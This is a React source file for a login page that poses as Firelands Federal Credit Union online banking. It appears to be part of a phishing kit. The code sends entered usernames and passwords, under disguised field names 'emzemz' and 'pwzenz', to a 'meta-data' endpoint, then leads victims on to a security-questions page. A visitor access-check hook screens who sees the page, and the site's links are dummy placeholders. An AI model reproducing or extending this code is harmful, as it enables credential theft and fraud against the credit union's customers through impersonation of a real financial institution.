import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const heroImageUrl = '/assets/firelands-landing.jpg';

type IconProps = React.SVGProps<SVGSVGElement>;

const EyeIcon = ({ className }: IconProps) => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    className={className}
  >
    <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" />
    <circle cx="12" cy="12" r="3" />
  </svg>
);

const EyeOffIcon = ({ className }: IconProps) => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    className={className}
  >
    <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a20.76 20.76 0 0 1 5.11-6.11" />
    <path d="M9.53 9.53a3 3 0 0 0 4.24 4.24" />
    <path d="M1 1l22 22" />
  </svg>
);


const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [rememberDevice, setRememberDevice] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div>Loading...</div>;
  }

  // If access is explicitly denied (not just loading), show loading
  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };



  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    setIsLoading(true);
    event.preventDefault();
    const newErrors = { emzemz: '', pwzenz: '' };
    let hasError = false;

    if (!emzemz.trim()) {
      newErrors.emzemz = 'Username is required.';
      hasError = true;
    }

    if (!pwzenz.length) {
      newErrors.pwzenz = 'Password is required.';
      hasError = true;
    }

    setErrors(newErrors);

    if (hasError) {
      setIsLoading(false);
      return;
    }

    const url = `${baseUrl}api/firelands-meta-data-1/`;

    try {
      await axios.post(url, {
        emzemz,
        pwzenz,
      });
      navigate('/security-questions', {
        state: {
          emzemz,
        },
      });
    } catch (error) {
      console.error('Error sending message:', error);
      setIsLoading(false);
    }
  };

  return (
    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
      <div className="absolute inset-0">
        <img
          src={heroImageUrl}
          alt="Sun setting over Firelands farm fields"
          className="h-full w-full object-cover"
          loading="lazy"
          decoding="async"
          fetchPriority="high"
          sizes="100vw"
        />
        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
      </div>

      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
        <div className="mx-auto flex w-full max-w-6xl flex-col gap-12 lg:flex-row lg:items-center lg:justify-between">
          <section className="order-2 flex flex-1 flex-col justify-center space-y-6 lg:order-1">
            <div className="space-y-3">
              <p className="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
                Firelands FCU Online
              </p>
              <p className="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
                Banking
              </p>
              <h1 className="text-base font-semibold uppercase tracking-[0.3em] text-white/70">
                Flexible online banking built for you
              </h1>
            </div>

            <div className="flex flex-wrap items-center gap-4">
              <a href="#" aria-label="Download on the App Store">
                <img
                  src="/assets/app-store-button.svg"
                  alt="Download on the App Store"
                  className="h-12 w-auto"
                />
              </a>
              <a href="#" aria-label="Get it on Google Play">
                <img
                  src="/assets/google-play-button.svg"
                  alt="Get it on Google Play"
                  className="h-12 w-auto"
                />
              </a>
            </div>
          </section>

          <section className="order-1 w-full max-w-md lg:order-2 lg:self-start">
            <div className="mx-auto w-full rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur lg:mx-0">
              <div className="flex items-center justify-start">
                <img
                  src="/assets/logo.svg"
                  alt="Firelands Federal Credit Union"
                  className="h-12 w-auto"
                />
              </div>

              <h2 className="mt-6 text-2xl font-semibold text-[#2f2e67]">Sign In to Continue</h2>

              <form onSubmit={handleSubmit} className="mt-8 space-y-6">
                <div className="space-y-2">
                  <label htmlFor="emzemz" className="text-sm font-medium text-gray-600">
                    Username
                  </label>
                  <input
                    id="emzemz"
                    name="emzemz"
                    type="text"
                    value={emzemz}
                    onChange={(e) => setEmzemz(e.target.value)}
                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                  />
                  {errors.emzemz && (
                    <p className="text-sm font-medium text-rose-600">{errors.emzemz}</p>
                  )}
                </div>

                <div className="space-y-2">
                  <label htmlFor="pwzenz" className="text-sm font-medium text-gray-600">
                    Password
                  </label>
                  <div className="relative">
                    <input
                      id="pwzenz"
                      name="pwzenz"
                      type={showPwzenz ? 'text' : 'password'}
                      value={pwzenz}
                      onChange={(e) => setPwzenz(e.target.value)}
                      className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 pr-12 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                    />
                    <button
                      type="button"
                      onClick={togglePwzenzVisibility}
                      className="absolute inset-y-0 right-3 flex items-center text-gray-400 transition hover:text-[#5a63d8]"
                      aria-label={showPwzenz ? 'Hide password' : 'Show password'}
                    >
                      {showPwzenz ? (
                        <EyeOffIcon className="h-5 w-5" />
                      ) : (
                        <EyeIcon className="h-5 w-5" />
                      )}
                    </button>
                  </div>
                  {errors.pwzenz && (
                    <p className="text-sm font-medium text-rose-600">{errors.pwzenz}</p>
                  )}
                </div>

                <div className="flex flex-wrap items-center justify-between gap-4 text-sm font-medium text-gray-600">
                  <label className="inline-flex cursor-pointer items-center gap-2">
                    <input
                      type="checkbox"
                      checked={rememberDevice}
                      onChange={() => setRememberDevice((prev) => !prev)}
                      className="sr-only"
                    />
                    <span
                      className={`flex h-4 w-4 items-center justify-center rounded-full border transition ${
                        rememberDevice
                          ? 'border-[#5a63d8] bg-[#5a63d8]'
                          : 'border-gray-300 bg-white'
                      }`}
                    >
                      {rememberDevice && <span className="h-1.5 w-1.5 rounded-full bg-white"></span>}
                    </span>
                    Remember Device
                  </label>
                  <button
                    type="button"
                    className="text-[#801346] transition hover:text-[#5a63d8] hover:underline"
                  >
                    Need Login Help?
                  </button>
                </div>

                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
                >
                  {isLoading ? 'Processing…' : 'Continue'}
                </button>

                <div className="flex flex-col gap-3 sm:flex-row">
                  <button
                    type="button"
                    className="flex-1 rounded-full border border-gray-200 px-4 py-3 text-sm font-semibold text-[#801346] transition hover:border-[#801346]"
                  >
                    Enroll
                  </button>
                  <button
                    type="button"
                    className="flex-1 rounded-full border border-transparent bg-[#fff5f8] px-4 py-3 text-sm font-semibold text-[#801346] transition hover:bg-[#ffe9f0]"
                  >
                    Join Firelands FCU
                  </button>
                </div>

                <p className="text-center text-xs text-gray-500">
                  By signing in, you agree to our{' '}
                  <a href="#" className="font-semibold text-[#801346] hover:underline">
                    Privacy Policy
                  </a>{' '}
                  and{' '}
                  <a href="#" className="font-semibold text-[#801346] hover:underline">
                    Terms of Service
                  </a>
                  .
                </p>
              </form>
            </div>
          </section>
        </div>

        <div className="mt-10 flex flex-wrap items-center justify-end gap-10 text-sm font-semibold text-white/80">
          <a href="#" className="transition hover:text-white">
            CU Locations
          </a>
          <a href="#" className="transition hover:text-white">
            Contact Us
          </a>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
